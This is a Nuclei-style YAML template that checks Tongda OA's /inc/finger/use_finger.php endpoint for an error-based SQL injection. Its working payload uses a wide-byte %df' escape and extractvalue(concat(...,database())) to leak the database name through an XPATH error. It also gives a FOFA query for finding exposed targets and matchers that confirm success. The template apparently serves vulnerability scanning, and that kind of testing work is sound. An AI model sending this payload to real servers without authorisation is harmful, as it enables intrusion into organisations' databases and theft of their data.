id: tongda-oa-use-finger-sqli

info:
  name: "通达OA use_finger.php 接口报错注入漏洞"
  author: Co5mos
  severity: critical
  description: |
    通达OA的 `/use_finger.php` 接口存在报错注入漏洞，攻击者可以利用该漏洞执行任意SQL语句，从而获取数据库中的敏感信息或控制数据库服务器。
  metadata:
    fofa-query: 'app="TDXK-通达OA"'
  tags: Tongda-OA

http:
  - method: GET
    path:
      - "{{BaseURL}}/inc/finger/use_finger.php?USER_ID=-123%df'and extractvalue(1, concat(0x5c,(database())))%23"

    matchers:
      - type: word
        part: body
        words:
          - "XPATH syntax error:"
          - "use_finger.php"
        condition: and
